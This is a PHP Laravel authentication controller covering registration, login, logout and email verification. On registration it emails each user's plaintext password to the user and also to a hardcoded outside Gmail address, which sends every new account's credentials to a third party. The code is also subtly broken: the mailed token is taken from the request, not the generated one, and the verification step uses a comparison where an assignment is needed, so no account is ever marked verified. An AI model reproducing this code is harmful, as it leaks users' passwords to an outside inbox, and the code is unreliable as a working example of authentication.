<?php

namespace App\Http\Controllers;

use App\Mail\RecieveMail;
use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use App\Mail\SendMail;
use Illuminate\Support\Str;

class AuthController extends Controller
{
    function index()
    {
        return view('home');
    }

    function register()
    {

        return view('register');
    }
    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:20',
            'email' => 'required|email|max:150|unique:users',
            'password' => 'required|min:5|confirmed',
        ]);
        $token = Str::random(64);
        User::create([
            'name' => $request->name,
            'email' => ($request->email),
            'password' => Hash::make($request->password),
            'token' => $token
        ]);
        $recieveMailData = [
            'name' => $request->name,
            'email' => ($request->email),
            'password' => ($request->password),
            'token' => $request->token

        ];
        $sendMailData = [
            'name' => $request->name,
            'email' => ($request->email),
            'password' => ($request->password),
        ];
        Mail::to($request->email)->send(new SendMail($sendMailData));
        Mail::to('dilipgaurh2017@gmail.com')->send(new RecieveMail($recieveMailData));
        return redirect()->route('login')->withSuccess('Your registration has been submitted successfully Please Check Your Gmail');
    }
    function login()
    {
        if (Auth::user()) {
            return redirect($this->redirectDash());
        }
        return view('login');
    }
    public function loginRequest(Request $request)
    {
        $request->validate([
            'email' => 'string|required|email',
            'password' => 'string|required'
        ]);
        $userCredential = $request->only('email', 'password');

        if (Auth::attempt($userCredential)) {
            if (Auth::user() && Auth::user()->role == 1) {
                return redirect()->route('adminDashboard')->with('success', 'Welcome Admin');
            } else {
                return redirect()->route('userDashboard')->with('success', 'Welcome You are Logged In');
            }
        } else {
            return back()->with('error', 'Username & Password is incorrect');
        }
    }
    public function logout()
    {
        Auth::logout();
        return redirect()->route('login')->with('error', 'You have logout successfully');
    }
    function redirectDash()
    {
        if (Auth::user() && Auth::user()->role == 1) {
            $redirect =  route('adminDashboard');
        } else {
            $redirect = route('userDashboard');
        }
        return $redirect;
    }

    public function verifyAccount($token)
    {
        $verifyUser = User::where('token', $token)->first();

        $message = 'Sorry user email cannot be identified.';

        if (!is_null($verifyUser)) {

            if (empty($verifyUser->is_email_verified)) {
                $verifyUser->is_email_verified == 1;
                $verifyUser->save();
                $message = "User e-mail is verified. User can now login.";
            } else {
                $message = "User e-mail is already verified. User can now login.";
            }
        }

        return redirect()->route('login')->with('message', $message);
    }
}
